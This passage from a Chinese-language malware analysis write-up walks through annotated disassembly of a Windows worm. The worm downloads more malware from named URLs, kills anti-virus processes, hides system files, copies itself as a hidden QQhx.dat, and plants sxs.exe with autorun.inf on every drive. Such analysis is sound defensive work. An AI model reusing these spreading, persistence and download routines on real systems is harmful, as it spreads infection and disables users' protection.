
```
.nsp0:00407961 retn

.nsp0:00407961 AdClick_And_Download endp ; sp = -18h

.nsp0:00407961
```

接下来看看下载线程二做了些什么：

```
.nsp0:00409A8C ; DWORD __stdcall ThreadDownload_02(LPVOID)

.nsp0:00409A8C ThreadDownload_02 proc near             ; DATA XREF: start+5F8 o

.nsp0:00409A8C

.nsp0:00409A8C var_8   = dword ptr -8

.nsp0:00409AF1         mov     ecx, offset aPopupMgr_0 ; "PopupMgr"

.nsp0:00409AF6         mov     edx, offset aSoftwareMicr_5 ; "Software\\Microsoft\\Internet Explorer\Ne"...

.nsp0:00409AFB         mov     eax, HKEY_CURRENT_USER

.nsp0:00409B00         call    Write_Reg               ; 这里和上一线程一样，设置下载标记

.nsp0:00409B05         push    offset a0_1             ; "0"

.nsp0:00409B0A         push    1

.nsp0:00409B0C         mov     ecx, offset aCheckedValue_1 ; "CheckedValue"

.nsp0:00409B11         mov     edx, offset aSoftwareMicr_1 ; "software\\microsoft\\windows\\currentversi"...

.nsp0:00409B16         mov     eax, HKEY_LOCAL_MACHINE

.nsp0:00409B1B         call    Write_Reg               ; 隐藏系统文件

.nsp0:00409B20         call    Enable_AutoRun_Inf      ; 通过写 reg 文件方式修改注册表项，使系统开启 autorun 功能.

.nsp0:00409B20                                 ; 用于打开各分区时自动运行病毒

.nsp0:00409B25         mov     eax, off_40B0F8

.nsp0:00409B2A         cmp     dword ptr [eax], 0

.nsp0:00409B2D         jz      short loc_409B34

.nsp0:00409B2F         call    Download_409b2f         ; 下载以下文件:

.nsp0:00409B2F                                 ; http://update1.cd321.net/30sie.rar

.nsp0:00409B2F                                 ; http://update1.cd321.net/30hie.rar

.nsp0:00409B34

......

.nsp0:00409B4E         retn

.nsp0:00409B4E ThreadDownload_02 endp ; sp = -28h
```

看完以上两个下载其它病毒线程，这回来总结这两线程做了些什么：

1. 下载病毒文件：
   - `http://update1.cd321.net/30hie.rar`
   - `http://update1.cd321.net/30sie.rar`
   - `http://update1.cd321.net/15tie.rar`
2. 弹出网页：
   - `http://www.cd321.net/ad.htm`
3. 获取下载病毒列表文件，然后下载相应的病毒：
   - `http://www.ctv163.com/admin/down.txt`
4. 增加网站流量：
   - `http://www.ctv163.com`
5. 修改注册表项使得中毒后无法显示系统隐藏文件；
6. 开启自动运行功能，以增加病毒运行机率。

讲完下载线程后自己大概看了下释放/盗取 `QQ` 部分，感觉很传统，也就没去分析，如果你有兴趣，可以去细分析下。我这里考虑到篇副的问题我就不写了。

第一次我分析时以为到这里也就结束了，当时直接在本机试也下，发现不对呀，病毒还是在不停的释放自身。

后来的仔细的再对了次代码发现原来病毒在 `Reg_Window` 的下面还放了一个 `timer`，跟进去看了下原来这才是我们最后的一个重点：病毒不停的释放病毒本身至各驱动器的根目录下。

详细代码如下：

```
.nsp0:00409C60 ; ================ S U B R O U T I N E =======================================

.nsp0:00409C60

.nsp0:00409C60 ; Attributes: bp-based frame

.nsp0:00409C60

.nsp0:00409C60 ; void __stdcall TimerFunc(HWND,UINT,UINT,DWORD)

.nsp0:00409C60 TimerFunc proc near                     ; DATA XREF: Reg_Window+AC o

.nsp0:00409C60

.nsp0:00409C60 var_C   = dword ptr -0Ch

.nsp0:00409C60 var_8   = dword ptr -8

.nsp0:00409C60 var_4   = dword ptr -4

.nsp0:00409C60

.nsp0:00409C60         push    ebp

.nsp0:00409C61         mov     ebp, esp

.nsp0:00409C63         push    0

.nsp0:00409C65         push    0

.nsp0:00409C67         push    0

.nsp0:00409C69         xor     eax, eax

.nsp0:00409C6B         push    ebp

.nsp0:00409C6C         push    offset j_@System@@HandleFinally$qqrv_25

.nsp0:00409C71         push    dword ptr fs:[eax]

.nsp0:00409C74         mov     fs:[eax], esp

.nsp0:00409C77         call    Kill_AV_                ; 关闭包含反病毒相关字样的程序

.nsp0:00409C7C         mov     eax, off_40B10C

.nsp0:00409C81         cmp     byte ptr [eax], 1

.nsp0:00409C84         jnz     end_409D8C

.nsp0:00409C8A         lea     eax, [ebp+var_4]

.nsp0:00409C8D         call    GetSysDir

.nsp0:00409C92         lea     eax, [ebp+var_4]

.nsp0:00409C95         mov     edx, offset aQqhx_dat_2 ; "QQhx.dat"

.nsp0:00409C9A         call    @System@@LStrCat$qqrv

.nsp0:00409C9F         mov     eax, [ebp+var_4]

.nsp0:00409CA2         call    @Sysutils@FileExists$qqrx17System@AnsiString

.nsp0:00409CA7         test    al, al

.nsp0:00409CA9         jnz     File_isExist            ; 判断%sysdir%\\qqhx.dat 文件是否存在

.nsp0:00409CAF         mov     eax, off_40B13C         ; 如果不存在则复制病毒体为该文件

.nsp0:00409CB4         mov     edx, 104h

.nsp0:00409CB9         call    @System@@LStrSetLength$qqrv

.nsp0:00409CBE         push    104h                    ; nSize

.nsp0:00409CC3         mov     eax, off_40B13C

.nsp0:00409CC8         mov     eax, [eax]

.nsp0:00409CCA         call    @System@@LStrToPChar$qqrx17System@AnsiString

.nsp0:00409CCF         push    eax                     ; lpFilename

.nsp0:00409CD0         mov     eax, hBase

.nsp0:00409CD5         push    eax                     ; hModule

.nsp0:00409CD6         call    GetModuleFileNameA

.nsp0:00409CDB         mov     edx, eax

.nsp0:00409CDD         mov     eax, off_40B13C

.nsp0:00409CE2         call    @System@@LStrSetLength$qqrv

.nsp0:00409CE7         push    0                       ; bFailIfExists

.nsp0:00409CE9         lea     eax, [ebp+var_8]

.nsp0:00409CEC         call    GetSysDir

.nsp0:00409CF1         lea     eax, [ebp+var_8]

.nsp0:00409CF4         mov     edx, offset aQqhx_dat_2 ; "QQhx.dat"

.nsp0:00409CF9         call    @System@@LStrCat$qqrv

.nsp0:00409CFE         mov     eax, [ebp+var_8]

.nsp0:00409D01         call    @System@@LStrToPChar$qqrx17System@AnsiString

.nsp0:00409D06         push    eax                     ; lpNewFileName

.nsp0:00409D07         mov     eax, off_40B13C

.nsp0:00409D0C         mov     eax, [eax]

.nsp0:00409D0E         call    @System@@LStrToPChar$qqrx17System@AnsiString

.nsp0:00409D13         push    eax                     ; lpExistingFileName

.nsp0:00409D14         call    CopyFileA

.nsp0:00409D19         push    6                       ; dwFileAttributes

.nsp0:00409D1B         lea     eax, [ebp+var_C]

.nsp0:00409D1E         call    GetSysDir

.nsp0:00409D23         lea     eax, [ebp+var_C]

.nsp0:00409D26         mov     edx, offset aQqhx_dat_2 ; "QQhx.dat"

.nsp0:00409D2B         call    @System@@LStrCat$qqrv

.nsp0:00409D30         mov     eax, [ebp+var_C]

.nsp0:00409D33         call    @System@@LStrToPChar$qqrx17System@AnsiString

.nsp0:00409D38         push    eax                     ; lpFileName

.nsp0:00409D39         call    SetFileAttributesA

.nsp0:00409D3E

.nsp0:00409D3E File_isExist:                           ; CODE XREF: TimerFunc+49 j

.nsp0:00409D3E         mov     eax, pOption_Infect_Driver

.nsp0:00409D43         mov     eax, [eax]

.nsp0:00409D45         mov     edx, offset aYes_1      ; "yes"

.nsp0:00409D4A         call    @System@@LStrCmp$qqrv

.nsp0:00409D4F         jnz     short loc_409D56

.nsp0:00409D51         call    CopyAutoRun_Inf_REMOVABLE ; 在中毒机器上的每个移动盘根目录下生成

.nsp0:00409D51                                 ; sxs.exe 和 autorun.inf 文件.

.nsp0:00409D56

.nsp0:00409D56 loc_409D56:                             ; CODE XREF: TimerFunc+EF j

.nsp0:00409D56         mov     eax, pOption_03

.nsp0:00409D5B         mov     eax, [eax]

.nsp0:00409D5D         mov     edx, offset aYes_1      ; "yes"

.nsp0:00409D62         call    @System@@LStrCmp$qqrv

.nsp0:00409D67         jnz     short end_409D8C

.nsp0:00409D69         call    GetOs

.nsp0:00409D6E         cmp     eax, 3

.nsp0:00409D71         jnz     short end_409D8C

.nsp0:00409D73         call    CopyAutoRun_Inf_Local   ; 在硬盘的各分区下生成 sxs.exe 和 autorun.inf 文件

.nsp0:00409D78         call    sub_406494              ; 这里也是复制病毒自身。
```
